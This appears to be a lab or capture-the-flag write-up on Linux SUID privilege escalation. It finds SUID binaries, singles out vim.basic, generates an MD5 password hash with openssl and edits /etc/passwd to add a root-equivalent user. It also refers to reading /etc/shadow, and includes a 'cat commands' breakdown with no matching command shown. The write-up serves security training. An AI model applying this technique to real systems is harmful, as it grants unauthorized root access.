### Question 1 — What is the full path of the binary in /usr/bin/ that is vulnerable to a SUID exploitation?

Ran a SUID search:

```shell
john@suid-box:~$ find / -perm -04000 -type f -ls 2>/dev/null

—SNIP—
     8620   4032 -rwsr-xr-x   1 root     root             4126400 Sep 25  2024 /usr/bin/vim.basic
     4587     72 -rwsr-xr-x   1 root     root               72792 May 30  2024 /usr/bin/chfn
    20328    272 -rwsr-xr-x   1 root     root              277936 Apr  8  2024 /usr/bin/sudo
    14336     40 -rwsr-xr-x   1 root     root               39296 Aug  9  2024 /usr/bin/umount
     4695     64 -rwsr-xr-x   1 root     root               64152 May 30  2024 /usr/bin/passwd
     4679     76 -rwsr-xr-x   1 root     root               76248 May 30  2024 /usr/bin/gpasswd
     1573     40 -rwsr-xr-x   1 root     root               40664 May 30  2024 /usr/bin/newgrp
     4589     44 -rwsr-xr-x   1 root     root               44760 May 30  2024 /usr/bin/chsh
    13682     40 -rwsr-xr-x   1 root     root               39296 Apr  8  2024 /usr/bin/fusermount3
     5648     56 -rwsr-xr-x   1 root     root               55680 Aug  9  2024 /usr/bin/su
     5862     52 -rwsr-xr-x   1 root     root               51584 Aug  9  2024 /usr/bin/mount
```

**Breakdown:**

- `find` searches the filesystem for files matching the given criteria
- `/` starts the search at the root directory, so the whole filesystem is covered
- `-perm -04000` matches files with the SUID bit set
- `-type f` restricts matches to regular files
- `-ls` lists each match in long-listing detail
- `2>/dev/null` discards error messages (e.g. from directories the current user can't read)

Most of this list is the standard set of Linux binaries that carry SUID by default for legitimate reasons — `sudo`, `passwd`, `gpasswd`, `newgrp`, `chsh`, `chfn`, `su`, `mount`, `umount`, `fusermount3`. `/usr/bin/vim.basic` doesn't belong in that set; a text editor having the SUID bit set isn't normal, which marks it as the exploitable one.

**Answer:** `/usr/bin/vim.basic`

**Breakdown of the `cat` commands:**

- `cat` prints a file's contents to the terminal
- `/etc/shadow` / `/etc/passwd` are the target files

The next step was generating a password hash to add a root-equivalent entry:

```shell
┌──(—REDACTED—㉿kali)-[~]
└─$ openssl passwd -1 -salt THM passwd1

$1$THM$ZWieDtvGEGoXuH8jaa6yS.
```

**Breakdown:**

- `openssl` is the cryptography toolkit being used here to generate a password hash; `passwd` is the subcommand for that
- `-1` selects the MD5-based hashing algorithm (giving the `$1$` prefix on the output)
- `-salt THM` sets the salt — random data mixed into the password before hashing — to the fixed string `THM`
- `passwd1` is the plaintext password being hashed

With the hash generated, opened `/etc/passwd` directly in `vim.basic` to add the new line:

```shell
john@suid-box:~$ vim /etc/passwd
```

Despite vim telling me that I cannot write to this file, it ended up being written to the file.

Vim's write warning comes from its own check against the real user running it, which is still the unprivileged `john` account — but because `vim.basic` itself has the SUID bit set, the actual write happens with root's effective privileges regardless of what vim's own warning says.
